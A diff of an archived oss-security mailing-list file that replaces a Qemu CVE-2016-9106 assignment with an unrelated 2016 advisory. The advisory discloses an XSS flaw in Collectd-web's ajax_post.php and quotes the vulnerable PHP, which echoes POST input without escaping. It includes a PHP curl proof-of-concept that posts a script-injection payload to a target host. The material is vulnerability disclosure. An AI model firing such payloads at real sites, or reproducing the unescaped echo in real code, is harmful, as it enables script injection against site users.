@@ -1,49 +1,124 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/10/30/10
-Message-ID: <91dfb06a63e541769819a7edbbee1429@imshyb02.MITRE.ORG>
-Date: Sun, 30 Oct 2016 15:45:30 -0400
-From: <cve-assign@...re.org>
-To: <ppandit@...hat.com>
-CC: <cve-assign@...re.org>, <oss-security@...ts.openwall.com>, <liqiang6-s@....cn>
-Subject: Re: CVE request Qemu: 9pfs: memory leakage in v9fs_write
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/05/22/1
+Message-ID: <CAC3DZsSAGJO6N4FbF_A4LU669hwsXST_vqKsR9zzEkPrKRr=Uw@mail.gmail.com>
+Date: Sun, 22 May 2016 04:18:15 -0400
+From: Mehrdad Linux <mehrdadlinux@...il.com>
+To: oss-security@...ts.openwall.com
+Subject: CVE Request -XSS Vulnerabilitie in Collectd-web
 Content-Type: text/plain; charset=utf-8
 
------BEGIN PGP SIGNED MESSAGE-----
-Hash: SHA256
+Title -Collectd-web XSS
 
-> Quick Emulator(Qemu) built with the VirtFS, host directory sharing via Plan 9
-> File System(9pfs) support, is vulnerable to a memory leakage issue. It could
-> occur when calling v9fs_write call.
-> 
-> A privileged user inside guest could use this flaw to leak the host memory
-> bytes resulting in DoS for other services.
-> 
-> https://lists.gnu.org/archive/html/qemu-devel/2016-10/msg02623.html
-> http://git.qemu.org/?p=qemu.git;a=commit;h=fdfcc9aeea1492f4b819a24c94dfb678145b1bf9
+# Exploit Title :  XSS Vulnerabilitie in Collectd-web
+# Date: Sun May 22 11:55:36 EDT 2016
+# Reported Date : Sun May 22 11:55:36 EDT 2016
+# Vendor Homepage: https://collectd.org/wiki/index.php/Collectd-web
+# Version: Version: 0.4.0
+# Software Link: https://github.com/httpdss/collectd-web
+# solution :https://github.com/httpdss/collectd-web/issues/77
+# Exploit Author :MehrdadLinux
+# Tested On : Linux Platforms.
+# Facebook : https://facebook.com/MehrdadLinux
+# Twitter : http://twitter.com/MehrdadLinux
+# Detailed Vul: http://blog.opsnit.com
+===========================================================================================
 
->> doesn't free an IO vector
+1. VULNERABILITY
+-------------------------
 
-Use CVE-2016-9106.
+XSS Vulnerabilitie  in Collectd-web  0.4.0 – January2016
 
-- -- 
-CVE Assignment Team
-M/S M300, 202 Burlington Road, Bedford, MA 01730 USA
-[ A PGP key is available for encrypted communications at
-  http://cve.mitre.org/cve/request_id.html ]
------BEGIN PGP SIGNATURE-----
-Version: GnuPG v1
 
-iQIcBAEBCAAGBQJYFkuQAAoJEHb/MwWLVhi2eq8P/2iZ0CeEPUH8YU5Mz7dSLayz
-VLPYWPJWgYviJbAvD7twWyAf2qYYpamLMGY0SiRSaV30xcB+yPbyXKZVwKoB8tt5
-DF4k61Rdzfnshrfo3/flhREW7qZSbKo/NA1HZX4PWwAk3PnD0wDV8AcambyzyB/E
-Jjwfw3fiaoZMtOZlsnsohvMpoI/PvwQYg8RUrD7zB6mit2D/jtdfXG6vuY4b0c22
-1UCitnP2Wsqb2Ex+52jwisTkeLxut6ZYyV77N1BX1WSPeDrESV+9E4mm6rFVYTgY
-1COL7WB1H7ZCoxgQ3G4oXN9YtOKzIDS8L1Zdn1XfKhA68FFtPQ9aP4bSDPlzeXDs
-Ort3rUCS2Fnk5y9WNR40l7r5E1D1ccr/bFS6+/N8dvBlNNGlJkh3bvaaUJgwmzUw
-RL2w7uPLQi+Qpi3AHxxKtY09cRrIa1wfHVVwnJ+x+rGOpFoIQRRK3sAosv3r2AJl
-eakEZxN2UJPmbTckOhOoyJ5ISNFQSytwzTG8a6DzO6+KJgqHBsmj9kTxkIHznKKi
-arlpGH+E6SzwOpTCst6257Ht3gCs0h1SPL1XPcL6fpmoy6ilkedce5rrSYKD+DBq
-f+flLN8q/89q/doPU+lmORuUSzwwzLfKTnJRtX9h2n0jasubBWnVAGyTQqHAmLKE
-/FY1TuwKHWAohSxEpMG6
-=GBCx
------END PGP SIGNATURE-----
+2. BACKGROUND
+-------------------------
+Collectd-web is a web-based front-end for RRD data collected by collectd.
+It is based on contrib/collection.cgi, a demo CGI script included in
+collectd.
+With strong emphasis on the usage of Jquery and JqueryUI, Collectd-Web
+manages to give sysadmins a nice yet functional interface.
+
+
+3. DESCRIPTION
+-------------------------
+XSS in ajax_post.php
+https://github.com/httpdss/collectd-web/blob/master/media/jqtouch/demos/main/ajax_post.php
+
+  1 <?php
+  2 $theaters = array("Los Gatos Cinema","Cinelux Plaza Theatre","Camera
+7");
+  3 $movies = array("Transformers","Knocked Up","Live Free Die Hard");
+  4 $title = "-";
+  5 if ($_POST["zip"]) {
+  6     $title = "Zip " . $_POST['zip'];
+  7 } else {
+  8     $title = $_POST['movie'];
+  9 }
+ 10 ?>
+ 11 <div>
+ 12     <div class="toolbar">
+ 13         <h1><?php echo $title ?></h1>
+ 14         <a href="#" class="button back">Back</a>
+ 15     </div>
+ 16     <ul class="edgetoedge">
+ 17     <?php
+ 18         if ($_POST['zip']) {
+ 19             foreach ($theaters as $theater) {
+ 20                 echo '<li><a href="#theater">' . $theater . '</a></li>';
+ 21             }
+ 22         } else {
+ 23             foreach ($movies as $movie) {
+ 24                 echo '<li><a href="#movie">' . $movie . '</a></li>';
+ 25             }
+ 26         }
+ 27     ?>
+ 28     </ul>
+ 29     <form action="ajax_post.php" method="POST">
+ 30     <ul class="rounded">
+ 31         <li><input type="text" name="zip" value="" placeholder="Live
+post event test" /></li>
+ 32     </ul>
+ 33     <a style="margin:0 10px;color:rgba(0,0,0,.9)" href="#"
+class="submit whiteButton">Submit</a>
+ 34
+ 35     </form>
+ 36 </div>
+
+in line 5 have VULNERABILITY in zip POST method
+
+
+====================================Exploit=========================================
+<?php
+$yourtarget = $argv[1];
+$ch = curl_init();
+curl_setopt($ch, CURLOPT_URL, "http://
+$yourtarget/collectd-web/media/jqtouch/demos/main/ajax_post.php");
+curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/4.0 (compatible; MSIE 5.01;
+Windows NT 5.0)");
+curl_setopt($ch, CURLOPT_POST, 1);
+curl_setopt($ch, CURLOPT_POSTFIELDS,
+"movie=></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(77,101,104,114,100,97,100,76,105,110,117,120,32,88,83,83))</SCRIPT>");
+$buf = curl_exec ($ch);
+curl_close($ch);
+unset($ch);
+echo $buf;
+?>
+
+=================================================================================
+
+4. discovered by :
+-------------------------
+
+The vulnerability has been discovered by Mehrdad Abbasi(MehrdadLinux) and
+Hossein Masoudi (cs.masoudi)
+email : MehrdadLinux (at) gmail (dot) com
+http://opsnit.com
+
+
+5 .LEGAL NOTICES
+-------------------------
+
+The information contained within this advisory is supplied "as-is" with
+no warranties or guarantees of fitness of use or otherwise. I accept no
+responsibility for any damage caused by the use or misuse of this
+information.
+
